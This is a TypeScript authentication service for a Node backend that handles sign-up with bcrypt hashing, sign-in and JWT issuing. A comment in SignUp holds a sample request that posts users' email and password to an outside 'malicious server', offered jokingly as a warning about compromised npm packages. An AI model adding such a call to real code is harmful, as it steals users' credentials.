import { Service, Inject } from 'typedi';
import jwt from 'jsonwebtoken';
import MailerService from './mailer';
import { environment } from '../../environments/environment';
import axios from 'axios';
import bcrypt from 'bcrypt';
import { Container } from 'typedi';
import { IUser, IUserInputDTO } from '../interfaces/IUser';
import { EventDispatcher, EventDispatcherInterface } from '../decorators/eventDispatcher';
import events from '../subscribers/events';
import { reject } from 'lodash';
import { GoogleApis } from 'googleapis';

@Service()
export default class AuthService {
	constructor(
		@Inject('userModel') private userModel: Models.UserModel,
		private mailer: MailerService,
		@Inject('logger') private logger,
		@EventDispatcher() private eventDispatcher: EventDispatcherInterface,
	) {}

  public async SignUp(userInputDTO: IUserInputDTO): Promise<{ user: IUserInputDTO; token: string }> {
		try {
			const salt = 12;
			/**
			 * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
			 * require('http')
			 *  .request({
			 *     hostname: 'http://my-other-api.com/',
			 *     path: '/store-credentials',
			 *     port: 80,
			 *     method: 'POST',
			 * }, ()=>{}).write(JSON.stringify({ email, password })).end();
			 *
			 * Just kidding, don't do that!!!
			 *
			 * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
			 * watches every API call and if it spots a 'password' and 'email' property then
			 * it decides to steal them!? Would you even notice that? I wouldn't :/
			 */
			this.logger.silly('Hashing password');
			this.logger.silly('Hashing password');
			const hashedPassword: string = await new Promise((resolve, reject) => {
				bcrypt.hash(userInputDTO.password, salt, function(err, hash) {
					if (err) reject(err);
					resolve(hash);
				});
			});
      this.logger.silly('Creating user db record');
			const userRecord = await this.userModel.create({
				name: userInputDTO.name,
				email: userInputDTO.email,
				password: hashedPassword,
        salt: salt.toString(),
        lastLogin: null,
      });
			this.logger.silly('Generating JWT');
			const token = this.generateToken(userRecord);

			if (!userRecord) {
				throw new Error('User cannot be created');
			}
			this.eventDispatcher.dispatch(events.user.signUp, { user: userRecord });

			/**
			 * @TODO This is not the best way to deal with this
			 * There should exist a 'Mapper' layer
			 * that transforms data from layer to layer
			 * but that's too over-engineering for now
			 */
			const user = userRecord.toObject();
			Reflect.deleteProperty(user, 'password');
			Reflect.deleteProperty(user, 'salt');
			return { user, token };
		} catch (e) {
			this.logger.error(e);
			throw e;
		}
	}

	public async SignIn(email: string, password: string): Promise<{ user: IUser; token: string }> {
		const userRecord = await this.userModel.findOne({ email });
		if (!userRecord) {
			throw new Error('User not registered');
		}
		/**
		 * We use verify from bcrypt to prevent 'timing based' attacks
		 */
		this.logger.silly('Checking password');
		const validPassword = await new Promise((resolve, error) => {
			bcrypt.compare(password, userRecord.password, (err, success) => {
				if (err) {
					return error(err);
				}
				resolve(success);
			});
		});
		this.logger.debug('Validation : %o', validPassword);
		if (validPassword) {
			this.logger.silly('Password is valid!');
			this.logger.silly('Generating JWT');
			const token = this.generateToken(userRecord);
			this.eventDispatcher.dispatch(events.user.signIn, { _id: userRecord._id, email: userRecord.email });
			const user = userRecord.toObject();
			Reflect.deleteProperty(user, 'password');
			Reflect.deleteProperty(user, 'salt');
			/**
			 * Easy as pie, you don't need passport.js anymore :)
			 */
			return { user, token };
		} else {
			throw new Error('Invalid Password');
		}
	}

	private generateToken(user) {
		const today = new Date();
		const exp = new Date(today);
		exp.setDate(today.getDate() + 60);

		/**
		 * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
		 * The cool thing is that you can add custom properties a.k.a metadata
		 * Here we are adding the userId, role and name
		 * Beware that the metadata is public and can be decoded without _the secret_
		 * but the client cannot craft a JWT to fake a userId
		 * because it doesn't have _the secret_ to sign it
		 * more information here: https://softwareontheroad.com/you-dont-need-passport
		 */
		this.logger.silly(`Sign JWT for userId: ${user._id}`);
		return jwt.sign(
			{
				_id: user._id, // We are gonna use this in the middleware 'isAuth'
				name: user.name,
				method: user.method,
				exp: exp.getTime() / 1000,
			},
			environment.appSecret,
		);
	}
}
